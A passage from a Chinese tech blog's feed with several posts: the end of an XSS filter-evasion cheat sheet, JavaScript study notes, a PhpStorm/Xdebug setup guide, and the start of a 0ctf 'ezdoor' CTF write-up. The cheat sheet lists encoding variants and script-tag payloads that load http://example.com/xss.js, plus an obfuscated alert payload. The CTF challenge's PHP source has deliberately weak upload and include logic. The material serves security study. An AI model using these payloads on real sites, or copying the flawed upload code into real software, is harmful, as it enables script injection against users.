class="headerlink" title="-字符转义表"></a>-字符转义表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt; </span><br><span class="line">%<span class="number">3</span>C </span><br><span class="line">&amp;lt </span><br><span class="line">&amp;lt; </span><br><span class="line">&amp;LT </span><br><span class="line">&amp;LT; </span><br><span class="line">&amp;#60 </span><br><span class="line">&amp;#060 </span><br><span class="line">&amp;#0060 </span><br><span class="line">&amp;#00060 </span><br><span class="line">&amp;#000060 </span><br><span class="line">&amp;#0000060 </span><br><span class="line">&amp;#60; </span><br><span class="line">&amp;#060; </span><br><span class="line">&amp;#0060; </span><br><span class="line">&amp;#00060; </span><br><span class="line">&amp;#000060; </span><br><span class="line">&amp;#0000060; </span><br><span class="line">&amp;#x3c </span><br><span class="line">&amp;#x03c </span><br><span class="line">&amp;#x003c </span><br><span class="line">&amp;#x0003c </span><br><span class="line">&amp;#x00003c </span><br><span class="line">&amp;#x000003c </span><br><span class="line">&amp;#x3c; </span><br><span class="line">&amp;#x03c; </span><br><span class="line">&amp;#x003c; </span><br><span class="line">&amp;#x0003c; </span><br><span class="line">&amp;#x00003c; </span><br><span class="line">&amp;#x000003c; </span><br><span class="line">&amp;#X3c </span><br><span class="line">&amp;#X03c </span><br><span class="line">&amp;#X003c </span><br><span class="line">&amp;#X0003c </span><br><span class="line">&amp;#X00003c </span><br><span class="line">&amp;#X000003c </span><br><span class="line">&amp;#X3c; </span><br><span class="line">&amp;#X03c; </span><br><span class="line">&amp;#X003c; </span><br><span class="line">&amp;#X0003c; </span><br><span class="line">&amp;#X00003c; </span><br><span class="line">&amp;#X000003c; </span><br><span class="line">&amp;#x3C </span><br><span class="line">&amp;#x03C </span><br><span class="line">&amp;#x003C </span><br><span class="line">&amp;#x0003C </span><br><span class="line">&amp;#x00003C </span><br><span class="line">&amp;#x000003C </span><br><span class="line">&amp;#x3C; </span><br><span class="line">&amp;#x03C; </span><br><span class="line">&amp;#x003C; </span><br><span class="line">&amp;#x0003C; </span><br><span class="line">&amp;#x00003C; </span><br><span class="line">&amp;#x000003C; </span><br><span class="line">&amp;#X3C </span><br><span class="line">&amp;#X03C </span><br><span class="line">&amp;#X003C </span><br><span class="line">&amp;#X0003C </span><br><span class="line">&amp;#X00003C </span><br><span class="line">&amp;#X000003C </span><br><span class="line">&amp;#X3C; </span><br><span class="line">&amp;#X03C; </span><br><span class="line">&amp;#X003C; </span><br><span class="line">&amp;#X0003C; </span><br><span class="line">&amp;#X00003C; </span><br><span class="line">&amp;#X000003C; </span><br><span class="line">\x3c </span><br><span class="line">\x3C </span><br><span class="line">\u003c </span><br><span class="line">\u003C</span><br></pre></td></tr></table></figure><h3 id="使用HTML引号包含的XSS"><a href="#使用HTML引号包含的XSS" class="headerlink" title="-使用HTML引号包含的XSS"></a>-使用HTML引号包含的XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> SRC=<span class="string">"http://example.com/xss.js"</span>&gt;&lt;<span class="regexp">/SCRIPT&gt; </span></span><br><span class="line"><span class="regexp">&lt;SCRIPT ="&gt;" SRC="http:/</span><span class="regexp">/example.com/</span>xss.js<span class="string">"&gt;&lt;/SCRIPT&gt; </span></span><br><span class="line"><span class="string">&lt;SCRIPT a="</span>&gt;<span class="string">" '' SRC="</span>http:<span class="comment">//example.com/xss.js"&gt;&lt;/SCRIPT&gt; </span></span><br><span class="line">&lt;SCRIPT <span class="string">"a='&gt;'"</span> SRC=<span class="string">"http://example.com/xss.js"</span>&gt;&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Other"><a href="#Other" class="headerlink" title="-Other"></a>-Other</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">`filter`</span>][<span class="string">`constructor`</span>](<span class="string">`ale`</span>.concat(<span class="string">`rt\x28`</span>.concat<span class="string">`0\x29`</span>))();<span class="comment">//</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;使用URL编码器对整个代码进行编码&quot;&gt;&lt;a href=&quot;#使用URL编码器对整个代码进行编码&quot; class=&quot;headerlink&quot; title=&quot;-使用URL编码器对整个代码进行编码&quot;&gt;&lt;/a&gt;-使用URL编码器对整个代码进行编码&lt;/h3&gt;&lt;figure cla
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript权威指南学习笔记</title>
    <link href="elssm.github.io/2018/06/07/JavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2018/06/07/JavaScript权威指南学习笔记/</id>
    <published>2018-06-07T05:41:50.000Z</published>
    <updated>2018-06-07T06:17:46.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h4 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h4><p>with语句用于临时扩展作用域链，它具有如下的语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with (object)</span><br><span class="line">statement</span><br></pre></td></tr></table></figure><p>这条语句将object添加到作用域链的头部，然后执行statement，最后把作用域链恢复到原始状态。</p><p>在严格模式中是禁止使用with语句的，并且在非严格模式里也是不推荐使用with语句的，那些使用with语句的JavaScript代码非常难于优化，并且同没有使用with语句的代码相比，它运行的更慢。</p><p>使用with关键字的目的是为了简化多次编写访问同一对象的工作，比如下面的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var qs = location.search.substring(1);</span><br><span class="line">var hostName = location.hostname;</span><br><span class="line">var url = location.href;</span><br></pre></td></tr></table></figure><p>如果使用with将会使代码变得简洁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with (location)&#123;</span><br><span class="line">  var qs = search.substring(1);</span><br><span class="line">  var hostName = hostname;</span><br><span class="line">  var url = href;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="use-strict"><a href="#use-strict" class="headerlink" title="use strict"></a>use strict</h4><p>“use strict”是ECMAScript5引入的一条指令，指令不是语句，“use strict”指令和普通的语句之间有两个重要的区别：</p><p>1：它不包含任何语言的关键字，指令仅仅是一个包含一个特殊字符串直接量的表达式（可以是使用单引号也可以使用双引号）</p><p>2：它只能出现在脚本代码的开始或者函数的开始，任何实体语句之前，但它不必一定出现在脚本的首行或函数体内的首行，因为“use strict”指令之后或之前都可能有其他字符串直接量表达式语句，并且javascript的具体实现可能将它们解析为解释器自有的指令。</p><p>使用“use strict”指令的目的是说明（脚本或函数中）后续的代码将会解析为严格代码，如果顶层（不在任何函数内的）代码使用了“use strict”指令，那么函数体的代码也是严格代码。如果eval()调用时所处的代码是严格代码或者eval()要执行的字符串中使用了“strict code”指令，则eval()内的代码也是严格代码。</p></li><li><h4 id="严格模式与非严格模式之间的区别​​"><a href="#严格模式与非严格模式之间的区别​​" class="headerlink" title="严格模式与非严格模式之间的区别​​"></a>严格模式与非严格模式之间的区别​​</h4><p>| 严格模式                                                     | 非严格模式                                                   |<br>| ———————————————————— | ———————————————————— |<br>| 禁止使用with语句                                             | 允许使用with语句                                             |<br>| 所有变量要先声明                                             | 使用未声明的变量将隐式声明为全局变量                         |<br>| 函数(非方法)中的<code>this</code>是<code>undefined</code>                          | <code>this</code>是全局对象                                             |<br>| <code>call()</code>和<code>apply()</code>传入的第一个值不会被转换                  | <code>call()</code>和<code>apply()</code>传入的第一个值如果是<code>null</code>和<code>undefined</code>，则会被全局对象取代，如果是原始值则转换为对应的包装对象 |<br>| 给只读属性和不可扩展的对象创建新成员将抛出类型错误异常       | 只是简单的操作失败                                           |<br>| 传入<code>eval()</code>的代码不能在定义变量和函数                       | 变量和函数定义在<code>eval()</code>创建的新作用域中                     |<br>| 函数中的<code>arguments</code>对象拥有传入函数值的静态副本              |                                                              |<br>| <code>delete</code>后跟非法标识符将抛出语法错误异常                     | 只是简单的返回<code>false</code>                                        |<br>| <code>delete</code>删除不可配置的属性将抛出类型错误异常                 | 只是简单的返回<code>false</code>                                        |<br>| 在对象直接量中定义多个同名属性将产生语法错误                 | 不会报错                                                     |<br>| 函数声明存在多个同名的参数将产生语法错误                     | 不会报错                                                     |<br>| 不允许使用八进制直接量                                       | 某些实现是允许的                                             |<br>| <code>eval</code>和<code>arguments</code>当作关键字，并且不允许更改                |                                                              |<br>| 限制了对栈的检测能力，<code>arguments.caller</code>和<code>arguments.callee</code>将抛出类型错误异常 |                                                              |</p></li></ul><p>在严格模式中，调用的函数（不是方法）中的一个this值是undefined。（在非严格模式中，调用的函数中的this值总是全局对象）。可以利用这种特性来判断javascript实现是否支持严格模式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hasStrictMode = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">    "use strict"</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>==unddfined&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>内置对象是由ECMAScript规范定义的对象或类。例如，数组，函数，日期和正则表达式都是内置对象。</p><p>宿主对象是由JavaScript解释器所嵌入的宿主环境（如web浏览器）定义的。客户端JavaScript中表示网页结构的HTMLElement对象均是宿主对象。既然宿主环境定义的方法可以当成普通的JavaScript函数对象，那么宿主对象也可以当成内置对象。</p><p>自定义对象是由运行中的JavaScript代码创建的对象</p><p>自由属性是直接在对象中定义的属性</p><p>继承属性是在对象的原型对象中定义的属性</p></li><li><h4 id="创建对象的方法"><a href="#创建对象的方法" class="headerlink" title="创建对象的方法"></a>创建对象的方法</h4><p>对象直接量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point=&#123;<span class="attr">x</span>:<span class="number">0</span>,<span class="attr">y</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><p>通过new创建对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=<span class="keyword">new</span> <span class="built_in">Object</span>();  <span class="comment">//创建一个空对象</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="keyword">new</span> <span class="built_in">Array</span>();   <span class="comment">//创建一个空数组</span></span><br><span class="line"><span class="keyword">var</span> d=<span class="keyword">new</span> <span class="built_in">Date</span>();    <span class="comment">//创建一个表示当前时间的Date对象</span></span><br><span class="line"><span class="keyword">var</span> r=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"js"</span>);  <span class="comment">//创建一个可以进行模式匹配的EegExp对象</span></span><br></pre></td></tr></table></figure><p>Object.create()</p><p>ECMAScript定义了一个名为Object.create()的方法，它创建一个新对象，其中第一个参数是这个对象的原型，Object.create()提供第二个可选参数，用以对对象的属性进行进一步描述。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=<span class="built_in">Object</span>.create(&#123;<span class="attr">x</span>:<span class="number">1</span>,<span class="attr">y</span>:<span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure></li><li><h4 id="作为数组的字符串"><a href="#作为数组的字符串" class="headerlink" title="作为数组的字符串"></a>作为数组的字符串</h4><p>在ECMAScript5中，字符串的行为类似于只读的数组，除了用charAt来访问单个的字符以外，还可以使用方括号：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=test</span><br><span class="line">s.charAt(o)   <span class="comment">//==&gt; "t"</span></span><br><span class="line">s[<span class="number">1</span>]          <span class="comment">//==&gt; "e"</span></span><br></pre></td></tr></table></figure><p>这里要注意，字符串是不可变值，故当把它们作为数组看待时，他们是只读的。如push(),sort(),reverse()和splice()等数组方法会修改数组，他们在字符串上是无效的，不仅如此，使用数组方法来修改字符串会导致错误，出错的时候没有提示。</p></li></ul><ul><li><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>作为函数</p><p>作为方法</p><p>作为构造函数</p><p>通过它们的call()和apply()方法间接调用</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;h4 id=&quot;with语句&quot;&gt;&lt;a href=&quot;#with语句&quot; class=&quot;headerlink&quot; title=&quot;with语句&quot;&gt;&lt;/a&gt;with语句&lt;/h4&gt;&lt;p&gt;with语句用于临时扩展作用域链，它具有如下的语法：&lt;/p&gt;
&lt;figure class=
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>phpstorm在phpstudy环境下的debug</title>
    <link href="elssm.github.io/2018/05/28/phpstorm%E5%9C%A8phpstudy%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84debug/"/>
    <id>elssm.github.io/2018/05/28/phpstorm在phpstudy环境下的debug/</id>
    <published>2018-05-28T11:49:42.000Z</published>
    <updated>2018-05-28T15:39:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="-环境说明"></a>-环境说明</h3><p>phpstudy的环境为apache+php</p><p>php版本：5.3.29</p><h3 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="-配置xdebug"></a>-配置xdebug</h3><p>因为phpstudy已经集成了xdebug扩展，所以我们只需要打开扩展并对php.ini文件进行修改即可。</p><ul><li><p>打开xdebug扩展，在phpstudy主页选择其他选项菜单</p><p><img src="/28/phpstorm在phpstudy环境下的debug/1.png" alt="1"></p></li><li><p>修改php.ini配置</p><p>打开php5.3版本下的php.ini文件，并添加如下信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure><p>此时我们在php5.3所在版本的文件夹下输入php -m命令，会发现在Zend Modules下多了Xdebug</p><p><img src="/28/phpstorm在phpstudy环境下的debug/2.png" alt="2"></p><p><img src="/28/phpstorm在phpstudy环境下的debug/3.png" alt="3"></p></li><li><p>此时查看phpinfo信息会发现有了xdebug配置</p><p><img src="/28/phpstorm在phpstudy环境下的debug/4.png" alt="4"></p></li></ul><h3 id="配置Xdebug-helper"><a href="#配置Xdebug-helper" class="headerlink" title="-配置Xdebug helper"></a>-配置Xdebug helper</h3><p>打开xdebug helper后，将IDE key设为phpstorm，并将localhost和127.0.0.1添加在Domain filter中</p><p><img src="/28/phpstorm在phpstudy环境下的debug/5.png" alt="5"></p><h3 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="-配置phpstorm"></a>-配置phpstorm</h3><ul><li><p>首先进入file–&gt;settings配置php环境，这里的php版本尽量与phpstudy中的php版本相同，配置如下</p><p><img src="/28/phpstorm在phpstudy环境下的debug/6.png" alt="6"></p><p><img src="/28/phpstorm在phpstudy环境下的debug/7.png" alt="7"></p></li><li><p>配置Debug，注意Debug port要和前面设置的php.ini中的端口相同</p><p><img src="/28/phpstorm在phpstudy环境下的debug/8.png" alt="8"></p></li><li><p>配置DBGp Proxy</p><p><img src="/28/phpstorm在phpstudy环境下的debug/9.png" alt="9"></p></li><li><p>配置Servers，name的名称可以随便起，Debugger选择Xdebug</p><p><img src="/28/phpstorm在phpstudy环境下的debug/10.png" alt></p></li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="-调试"></a>-调试</h3><ul><li><p>在phpstorm中打开监听连接</p><p><img src="/28/phpstorm在phpstudy环境下的debug/11.jpg" alt></p></li><li><p>断点打好之后，在浏览器中开启xdebug</p><p><img src="/28/phpstorm在phpstudy环境下的debug/12.png" alt></p></li><li><p>phpstorm中将会输出信息</p><p><img src="/28/phpstorm在phpstudy环境下的debug/13.png" alt></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;环境说明&quot;&gt;&lt;a href=&quot;#环境说明&quot; class=&quot;headerlink&quot; title=&quot;-环境说明&quot;&gt;&lt;/a&gt;-环境说明&lt;/h3&gt;&lt;p&gt;phpstudy的环境为apache+php&lt;/p&gt;
&lt;p&gt;php版本：5.3.29&lt;/p&gt;
&lt;h3 id=&quot;配置xde
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018 0ctf ezdoor题目复现</title>
    <link href="elssm.github.io/2018/05/04/2018-0ctf-ezdoor%E5%A4%8D%E7%8E%B0/"/>
    <id>elssm.github.io/2018/05/04/2018-0ctf-ezdoor复现/</id>
    <published>2018-05-04T08:06:27.000Z</published>
    <updated>2018-05-07T12:19:12.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>之前在做0ctf的时候就看了这一道php代码审计题目，当时没做出来，好在github上有源码，决定在服务器下搭建一下环境过一遍这道题，顺便学习学习有关php的一些知识。</p><p>​</p></li><li><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h5 id="我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。"><a href="#我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。" class="headerlink" title="我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。"></a>我使用的是ubuntu系统，首先要安装docker，docker的安装大家可以自行百度。</h5><h5 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h5 id="将题目源码拉到本地，使用git-clone命令"><a href="#将题目源码拉到本地，使用git-clone命令" class="headerlink" title="将题目源码拉到本地，使用git clone命令"></a>将题目源码拉到本地，使用git clone命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/LyleMi/My-CTF-Challenges.git</span><br></pre></td></tr></table></figure><h5 id="修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹"><a href="#修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹" class="headerlink" title="修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹"></a>修改Dockerfile文件，在文件中添加一行，用来创建sandbox文件夹</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RUN mkdir /var/www/html/sandbox/</span><br></pre></td></tr></table></figure><h5 id="进入到source文件夹创建镜像"><a href="#进入到source文件夹创建镜像" class="headerlink" title="进入到source文件夹创建镜像"></a>进入到source文件夹创建镜像</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 0ctf-ezdoor .</span><br></pre></td></tr></table></figure><h5 id="启动环境，这里的8585端口可以设置为任意一个未被占用的端口"><a href="#启动环境，这里的8585端口可以设置为任意一个未被占用的端口" class="headerlink" title="启动环境，这里的8585端口可以设置为任意一个未被占用的端口"></a>启动环境，这里的8585端口可以设置为任意一个未被占用的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit -p 8585:80 --name 0ctf-ezdoor 0ctf-ezdoor</span><br></pre></td></tr></table></figure><h5 id="之后访问http-ip-8585即可"><a href="#之后访问http-ip-8585即可" class="headerlink" title="之后访问http://ip:8585即可"></a>之后访问<a href="http://ip:8585即可" target="_blank" rel="noopener">http://ip:8585即可</a></h5></li></ul><ul><li><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir . <span class="string">"index.php"</span>))&#123;</span><br><span class="line">  touch($dir . <span class="string">"index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">    unlink($dir);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($dir . $file);</span><br><span class="line">  &#125;</span><br><span class="line">  rmdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'phpinfo'</span>:</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"phpinfo.txt"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'reset'</span>:</span><br><span class="line">    clear($dir);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'time'</span>:</span><br><span class="line">    <span class="keyword">echo</span> time();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"name"</span>]) || !<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = $dir . $_GET[<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $name);</span><br><span class="line">    $size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (scandir($dir) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">      <span class="keyword">if</span> (in_array($file, [<span class="string">"."</span>, <span class="string">".."</span>])) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      $size += filesize($dir . $file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($size &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      clear($dir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    ini_set(<span class="string">"open_basedir"</span>, <span class="string">"/var/www/html/$dir:/var/www/html/flag"</span>);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会根据每个人的ip地址生成一个sandbox文件夹，并在sandbox文件夹下生成一个index.php文件。switch case下有很多方式，注意到case ‘upload’看到有文件上传，主要代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[^a-zA-Z0-9.\/]/"</span>, $name) ||</span><br><span class="line">      stristr(pathinfo($name)[<span class="string">"extension"</span>], <span class="string">"h"</span>)) 